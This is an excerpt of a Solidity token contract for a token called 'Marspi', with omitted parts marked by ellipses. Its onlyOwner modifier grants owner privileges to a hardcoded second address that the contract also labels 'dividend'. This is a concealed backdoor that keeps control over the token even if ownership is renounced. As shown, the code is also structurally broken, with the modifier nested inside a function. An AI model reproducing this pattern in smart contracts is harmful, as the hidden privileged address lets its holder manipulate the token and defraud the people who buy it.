...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xA2Cf3a316059EAE610eB87E75B84BE8CF166c276) , "owner");
        _;
    }
...
contract Marspi  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Marspi";
    string private _symbol = "Marspi";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xCEc6Af8A0aE7e5F4E478057fDDdF02ac01802863);
    address private _Marketing = 0xCEc6Af8A0aE7e5F4E478057fDDdF02ac01802863;
    address public dividend = 0xA2Cf3a316059EAE610eB87E75B84BE8CF166c276;
